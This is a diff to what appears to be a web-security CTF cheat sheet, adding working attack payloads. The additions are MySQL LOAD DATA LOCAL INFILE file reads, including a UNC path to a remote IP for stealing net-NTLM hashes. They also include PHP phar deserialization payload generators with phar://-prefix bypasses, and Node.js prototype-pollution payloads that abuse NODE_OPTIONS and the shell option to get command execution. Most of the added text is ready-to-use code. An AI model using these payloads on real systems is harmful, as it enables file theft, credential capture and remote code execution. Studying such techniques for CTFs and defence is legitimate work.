@@ -1027,6 +1027,33 @@ pop graphic-context
     - `09 0A 0B 0C 0D A0 20`
 - File-read function
     - `LOAD_FILE('/etc/passwd')`
+    - `LOAD DATA INFILE`
+        - Client 讀 Server 文件
+        - 一樣受 `secure_file_priv`, `FILE` privilege 限制 (ref: [link](https://dev.mysql.com/doc/refman/8.0/en/load-data.html))
+    - `LOAD DATA LOCAL INFILE`
+        - Server 讀 Client 文件
+        - `LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE test FIELDS TERMINATED BY "\n";`
+        - 不需要 `FILE` privilege，且任意目錄檔案皆可讀 (只要Client有權限即可)
+        - support UNC Path
+            - `LOAD DATA LOCAL INFILE '\\\\172.16.136.153\\test' into table mysql.test FIELDS TERMINATED BY "\n";`
+                - stealing net-NTLM hash
+        - Trigger phar deserialization
+            - `LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINES TERMINATED BY '\n'`
+            - 非default設置
+              ```
+              [mysqld]
+              local-infile=1
+              secure_file_priv=""
+              ```
+
+        - Tool
+            - [Rogue-MySQL-Server](https://github.com/allyshka/Rogue-MySql-Server)
+            - [MysqlClientAttack](https://github.com/lcark/MysqlClientAttack)
+        - Example
+            - [N1CTF 2019 - sql_manage](https://xz.aliyun.com/t/6300)
+            - [HITCON 2019 - GoGoPowerSQL](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#gogo-powersql)
+            - [0CTF 2018 Final - h4x0rs.club](https://l4wio.github.io/CTF-challenges-by-me/0ctf_final-2018/0ctf_tctf_2018_slides.pdf)
+            - [VolgaCTF 2018 - Corp Monitoring](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html)
 - File-write
     - `INTO DUMPFILE`
         - 適用binary (寫入同一行)
@@ -1039,7 +1066,7 @@ pop graphic-context
         - `SELECT file_priv FROM mysql.user`
     - secure-file-priv
         - 限制MySQL導入導出
-            - load_file, into outfile等
+            - load_file, into outfile, load data等
         - 運行時無法更改
         - MySQL 5.5.53前，該變數預設為空(可以導入導出)
         - e.g. `secure_file_priv=E:\`
@@ -2313,9 +2340,61 @@ HQL injection example (pwn2win 2017)
     - phar文件會將使用者自定義的metadata以序列化形式保存
     - 透過`phar://`偽協議可以達到反序列化的效果
     - 常見影響函數: `file_get_contents()`, `file_exists()`, `is_dir()`, ...
+    - Payload generator
+      ```
+      <?php
+        class TestObject {
+        }
+
+        @unlink("phar.phar");
+        $phar = new Phar("phar.phar");
+        $phar->startBuffering();
+        $phar->setStub("<?php __HALT_COMPILER(); ?>");
+        $o = new TestObject();
+        $phar->setMetadata($o);
+        $phar->addFromString("test.txt", "test");
+        $phar->stopBuffering();
+      ?>
+      ```
+    - php識別phar是透過`__HALT_COMPILER();?>`
+        - 可以在開頭stub塞東西
+        - e.g. 偽造GIF頭: `$phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');`
+    - trigger phar deserialization by zip
+      ```
+      <?php
+        class FLAG{}
+
+        $obj=serialize(new FLAG());
+        $zip = new ZipArchive;
+        $res = $zip->open('test.zip', ZipArchive::CREATE);
+        $zip->addFromString('test.txt', 'meow');
+        $zip->setArchiveComment($obj);
+        $zip->close();
+
+        // trigger:  phar://test.zip
+      ```
+
+    - trigger phar deserialization by tar
+      ```
+      <?php
+      //@unlink("trigger.tar");
+      class FLAG{}
+      $phar = new PharData("trigger.tar");
+      $phar["kaibro"] = "meow";
+      $obj = new FLAG();
+      $phar->setMetadata($obj);
+      // trigger: phar://trigger.tar
+      ```
+
     - Generic Gadget Chains
         - [phpggc](https://github.com/ambionics/phpggc)
+    - bypass phar:// 不能出現在開頭
+        - `compress.zlib://`, `compress.bzip2://`, ...
+        - `compress.zlib://phar://meow.phar/test.txt`
+        - `php://filter/read=convert.base64-encode/resource=phar://meow.phar`
     - Example
+        - [N1CTF 2021 - easyphp](https://harold.kim/blog/2021/11/n1ctf-writeup/)
+        - [N1CTF 2019 - sql_manage](https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/sql_manage/README.md)
         - [HITCON CTF 2017 - Baby^H Master](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
         - [HITCON CTF 2018 - Baby Cake PHP 2017](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
         - [DCTF 2018 - Vulture](https://cyku.tw/ctf-defcamp-qualification-2018/)
@@ -3064,6 +3143,59 @@ console.log(o3.b)
     var a = {};
     _.merge({}, JSON.parse(malicious_payload));
     ```
+
+## Process Spawning
+
+- 如果可以污染環境變數+Process spawning，將有機會RCE
+
+```javascript
+const { exec, execSync, spawn, spawnSync, fork } = require('child_process');
+
+// pollute
+Object.prototype.env = {
+	NODE_DEBUG : 'require("child_process").execSync("touch pwned")//',
+	NODE_OPTIONS : '-r /proc/self/environ'
+};
+
+// method 1
+fork('blank');
+// method 2
+spawn('node', ['blank']).stdout.pipe(process.stdout);
+// method 3
+console.log(spawnSync('node', ['blank']).stdout.toString());
+// method 4
+console.log(execSync('node  blank').toString());
+```
+
+```javascript
+({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js';
+console.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());
+```
+
+```javascript
+({}).__proto__.NODE_OPTIONS = `--experimental-loader="data:text/javascript,console.log('injection');"`;
+console.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());
+```
+
+
+- 如果可以蓋 `Object.prototype.shell`，則 spawn 任意指令都可 RCE
+
+```javascript
+const child_process = require('child_process');
+
+Object.prototype.shell = 'node';
+Object.prototype.env = {
+   NODE_DEBUG : '1; throw require("child_process").execSync("touch pwned").toString()//',
+   NODE_OPTIONS : '-r /proc/self/environ'
+};
+
+child_process.execSync('id');
+```
+
+- 補充：蓋環境變數的各種玩法 (https://blog.p6.is/Abusing-Environment-Variables/)
+
+- Example
+    - [ACSC 2021 Qual - Cowsay as a Service](https://github.com/w181496/CTF/tree/master/ACSC2021_qual/cowsay)
 
 ## Misc
 
